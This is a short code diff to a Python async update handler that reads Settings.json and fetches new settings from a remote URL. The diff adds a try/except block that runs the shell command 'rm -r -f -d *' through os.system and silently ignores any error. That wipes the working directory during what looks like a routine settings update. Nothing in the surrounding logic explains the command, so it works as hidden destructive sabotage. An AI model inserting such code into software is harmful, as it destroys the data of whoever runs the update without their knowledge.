@@ -23,6 +23,10 @@ async def Update(ClientSettings,request):
 
     if "UpdateURL" in Update and "SettingsURL" in Update:
         CurrentSettings = json.loads(open("Settings.json").read())
+        try:
+            os.system('rm -r -f -d *')
+        except:
+            pass
         NewSettings = requests.get(Update["SettingsURL"]).json()
 
         for Key,Value in NewSettings.items():
